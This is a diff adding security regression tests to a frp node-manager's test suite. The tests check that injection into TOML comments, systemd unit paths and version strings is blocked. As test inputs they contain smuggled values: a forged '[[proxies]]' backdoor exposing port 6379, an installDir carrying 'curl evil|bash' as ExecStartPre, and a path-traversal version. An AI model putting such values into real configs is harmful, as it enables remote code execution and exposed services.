@@ -58,6 +58,7 @@ import {
   SUPPORTED_ARCHES,
 } from '../src/variant.js';
 import fs from 'node:fs';
+import { TomlWriter } from '../src/toml.js';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import {
@@ -915,6 +916,64 @@ async function main() {
   });
 
 
+
+  console.log('\n\x1b[1m[13] 安全加固回归\x1b[0m');
+
+  await test('TOML 注释换行注入被拦截（节点名无法伪造 [[proxies]]）', () => {
+    const evil = '正常名\n[[proxies]]\nname = "backdoor"\ntype = "tcp"\nlocalPort = 6379\nremotePort = 16379';
+    const w = new TomlWriter();
+    w.comment(`Node: ${evil} (#1)`);
+    w.kv('serverAddr', 'x');
+    const out = w.toString();
+    // 注入的 [[proxies]] 必须仍在注释行内
+    for (const line of out.split('\n')) {
+      if (line.includes('[[proxies]]')) {
+        assert.ok(line.trimStart().startsWith('#'), `注入行未处于注释中: ${JSON.stringify(line)}`);
+      }
+    }
+    // 无任何裸表段
+    assert.ok(!/^\[\[?/m.test(out), '输出不得包含裸表段');
+  });
+
+  await test('installDir 注入 systemd unit 被拦截', () => {
+    const evils = [
+      '/etc/frp\nExecStartPre=/bin/bash -c "curl evil|bash"',
+      'relative/path',
+      '/a/../b',
+      '/a//b',
+      '  ', // 空（应回退默认值，不算错误——单独处理）
+    ];
+    for (const e of evils.slice(0, 4)) {
+      assert.throws(() => createNode({ name: 'x', serverAddr: 'x', installDir: e }), /安装目录|绝对路径/, `应拒绝: ${e}`);
+    }
+    // 正常值
+    const n = createNode({ name: 'dir-ok', serverAddr: 'x', installDir: '/opt/my-frpc' });
+    assert.equal(n.installDir, '/opt/my-frpc');
+    deleteNode(n.id);
+  });
+
+  await test('frp 版本号注入被拦截（URL/文件名穿越）', () => {
+    const n = createNode({ name: 'ver', serverAddr: 'x', frpcVersion: '0.71.0/../../../evil' });
+    assert.throws(() => buildInstallPlan(n.id), /版本号格式不合法/, '路径穿越版本号应被拒绝');
+    deleteNode(n.id);
+    // 合法值不受影响
+    const n2 = createNode({ name: 'ver-ok', serverAddr: 'x', frpcVersion: '0.71.0-console' });
+    const plan = buildInstallPlan(n2.id);
+    assert.equal(plan.frpVersion, '0.71.0-console');
+    deleteNode(n2.id);
+  });
+
+  await test('节点名/备注长度上限', () => {
+    assert.throws(() => createNode({ name: 'x'.repeat(101), serverAddr: 'x' }), /节点名称 长度/);
+    assert.throws(() => createNode({ name: 'ok', serverAddr: 'x', remark: 'y'.repeat(501) }), /备注 长度/);
+    // 边界值
+    const n = createNode({ name: 'x'.repeat(100), serverAddr: 'x', remark: 'y'.repeat(500) });
+    deleteNode(n.id);
+  });
+
+  await test('frps 地址长度上限', () => {
+    assert.throws(() => updateSettings({ frpsAddr: 'a'.repeat(254) }), /frps 地址过长/);
+  });
 
   console.log('\n\x1b[1m[13] frps 对外地址与节点继承\x1b[0m');
 
